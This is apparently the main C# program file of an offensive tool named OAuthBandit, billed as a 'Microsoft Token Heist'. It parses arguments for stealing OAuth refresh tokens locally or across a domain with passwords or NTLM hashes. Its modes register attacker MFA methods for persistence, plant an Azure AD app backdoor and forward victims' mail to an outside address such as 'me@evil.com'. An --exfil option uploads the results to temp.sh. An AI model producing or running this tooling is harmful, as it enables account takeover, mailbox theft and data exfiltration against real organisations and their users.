using OAuthBandit.Core;
using OAuthBandit.Mfa;

namespace OAuthBandit;

public class Program
{
    public static void Main(string[] args)
    {
        if (args.Any(a => a is "--help" or "-help" or "-h"))
        {
            PrintHelp();
            return;
        }

        if (args.Length == 0)
        {
            new BanditEngine("local").RunLocal(".");
            return;
        }

        // Parse arguments
        bool isLocal = args.Contains("--local") || args.Contains("-l");
        bool isMfa = args.Contains("--mfa");
        bool isAppReg = args.Contains("--app-reg");
        bool isExfil = args.Contains("--exfil");
        bool isValidate = args.Contains("--validate") || args.Contains("-v");
        string? mailFwd = GetArgValue(args, "--mail-fwd");
        string? tokenValue = GetArgValue(args, "--token");
        string? tokenFile = GetArgValue(args, "--tokenfile");
        string tenant = GetArgValue(args, "--tenant") ?? "common";
        string outputDir = GetArgValue(args, "-output") ?? GetArgValue(args, "-o") ?? ".";
        string? hashes = GetArgValue(args, "-hashes");
        int threads = int.TryParse(GetArgValue(args, "-threads"), out var t) ? t : 10;
        int retry = int.TryParse(GetArgValue(args, "-retry"), out var r) ? r : 1;
        double mfaDelay = double.TryParse(GetArgValue(args, "--mfa-delay"), out var d) ? d : 2.0;
        string? computerArg = GetArgValue(args, "-computer");

        // Detect target (first arg that looks like domain/user:pass@ip)
        string? target = null;
        if (args.Length > 0 && !args[0].StartsWith("-") && (args[0].Contains('@') || args[0].Contains('/')))
            target = args[0];

        // Mode: Mail redirect
        if (mailFwd != null && (tokenValue != null || tokenFile != null) && target == null)
        {
            var engine = new BanditEngine("mail-fwd");
            var tokens = tokenValue != null ? new List<string> { tokenValue } : new List<string>();
            engine.RunMailRedirect(tokens, tokenFile, tenant, mailFwd, outputDir);
            if (isExfil) Exfiltrate(outputDir);
            return;
        }

        // Mode: App Registration standalone
        if (isAppReg && (tokenValue != null || tokenFile != null) && target == null)
        {
            var engine = new BanditEngine("app-reg");
            var tokens = tokenValue != null ? new List<string> { tokenValue } : new List<string>();
            engine.RunAppRegister(tokens, tokenFile, tenant, outputDir);
            if (isExfil) Exfiltrate(outputDir);
            return;
        }

        // Mode: MFA standalone
        if (isMfa && (tokenValue != null || tokenFile != null) && target == null)
        {
            var engine = new BanditEngine("mfa");
            var tokens = tokenValue != null ? new List<string> { tokenValue } : new List<string>();
            engine.RunMfaStandalone(tokens, tokenFile, tenant, outputDir);
            if (isExfil) Exfiltrate(outputDir);
            return;
        }

        // Mode: Local
        if (isLocal || target == null)
        {
            var engine = new BanditEngine("local");
            engine.RunLocal(outputDir, isMfa, isValidate);
            if (isExfil) Exfiltrate(outputDir);
            return;
        }

        // Mode: Remote
        var (domain, username, password, dcIp) = ParseTarget(target);
        if (string.IsNullOrEmpty(dcIp))
        {
            Console.WriteLine("[!] Error: DC IP address required for remote mode");
            Console.WriteLine("    Format: domain/username:password@dc_ip");
            return;
        }

        string? nthash = null;
        if (hashes != null)
        {
            nthash = hashes.Contains(':') ? hashes.Split(':')[1] : hashes;
        }

        List<string>? targetComputers = null;
        if (computerArg != null)
            targetComputers = computerArg.Split(',').Select(c => c.Trim()).ToList();

        var remoteEngine = new BanditEngine("remote");
        remoteEngine.RunRemote(dcIp, domain, username, password, nthash,
            threads, targetComputers, outputDir, isMfa, mfaDelay, retry);
        if (isExfil) Exfiltrate(outputDir);
    }

    private static (string domain, string username, string password, string dcIp) ParseTarget(string target)
    {
        string domain = "", username = "", password = "", dcIp = "";

        if (target.Contains('@'))
        {
            var idx = target.LastIndexOf('@');
            dcIp = target[(idx + 1)..];
            target = target[..idx];
        }

        if (target.Contains('/'))
        {
            var idx = target.IndexOf('/');
            domain = target[..idx];
            target = target[(idx + 1)..];
        }

        if (target.Contains(':'))
        {
            var idx = target.IndexOf(':');
            username = target[..idx];
            password = target[(idx + 1)..];
        }
        else
        {
            username = target;
        }

        return (domain, username, password, dcIp);
    }

    private static string? GetArgValue(string[] args, string name)
    {
        for (int i = 0; i < args.Length - 1; i++)
            if (args[i].Equals(name, StringComparison.OrdinalIgnoreCase))
                return args[i + 1];
        return null;
    }

    private static void Exfiltrate(string outputDir)
    {
        var exportDir = Path.Combine(outputDir, "export");
        var exfil = new Exfiltrator();
        exfil.UploadExportDir(exportDir);
    }

    private static void PrintHelp()
    {
        Console.WriteLine(@"
OAuthBandit v2.0 - Microsoft Token Heist

Usage:
  oauthbandit.exe                                       Local extraction (default)
  oauthbandit.exe --local                               Local extraction (explicit)
  oauthbandit.exe --validate                              Local + test tokens auth
  oauthbandit.exe --mfa                                 Local + auto MFA persistence
  oauthbandit.exe --mfa --token ""1.AV0A...""             MFA standalone
  oauthbandit.exe --mfa --tokenfile tokens.txt          MFA from file
  oauthbandit.exe --app-reg --token ""1.AV0A...""         App registration backdoor
  oauthbandit.exe --app-reg --tokenfile tokens.txt      App reg from file
  oauthbandit.exe --mail-fwd me@evil.com --token RT     Redirect victim mail
  oauthbandit.exe DOMAIN/admin:pass@10.0.0.1            Remote domain-wide
  oauthbandit.exe DOMAIN/admin@10.0.0.1 -hashes :NT    Remote with hash
  oauthbandit.exe DOMAIN/admin:pass@10.0.0.1 --mfa     Remote + MFA batch
  oauthbandit.exe --exfil                               Exfiltrate to temp.sh

Options:
  --local, -l          Local mode (default)
  --validate, -v       Test auth with extracted tokens
  --mfa                Auto-register MFA (TOTP+TAP)
  --app-reg            Register Azure AD app backdoor
  --mail-fwd EMAIL     Forward all mail to EMAIL
  --token RT           Refresh token value
  --tokenfile FILE     File with refresh tokens
  --tenant ID          Tenant ID (default: common)
  --exfil              Exfiltrate results to temp.sh
  -hashes LM:NT       NTLM hashes for remote auth
  -threads N           Thread count (default: 10)
  -retry N             Retry count per machine (default: 1)
  --mfa-delay SEC      Delay between MFA requests (default: 2.0)
  -computer HOST       Target specific computer(s)
  -output, -o DIR      Output directory (default: current)
  --help, -h           Show this help
");
    }
}
